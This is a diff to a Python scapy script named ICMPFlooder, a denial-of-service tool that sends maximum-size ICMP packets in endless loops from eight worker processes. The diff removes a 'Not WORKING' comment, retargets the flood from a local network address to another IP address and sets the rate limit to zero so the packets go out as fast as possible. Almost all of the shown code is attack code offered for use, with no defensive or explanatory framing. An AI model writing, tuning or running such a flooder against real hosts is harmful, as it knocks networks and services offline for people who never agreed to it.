@@ -1,5 +1,3 @@
-#Not WORKING
-
 from scapy.all import *
 import multiprocessing
 import random
@@ -7,10 +5,10 @@ import time
 import os
 
 
-TARGET = "192.168.1.16"
+TARGET = "100.79.68.94"
 WORKERS = 8
 PAYLOAD_SIZE = 65495 # Max practical payload (65507-12)
-RATE_LIMIT = 0.0001   
+RATE_LIMIT = 0.0000   
 
 
 class ICMPFlooder:
@@ -31,7 +29,7 @@ class ICMPFlooder:
             ptk=self.craft_packet()
             while True:
                 self.socket.send(ptk)
-                #time.sleep(RATE_LIMIT)
+                time.sleep(RATE_LIMIT)
         except Exception as e:
             print(f"Worker error: {str(e)}")
 
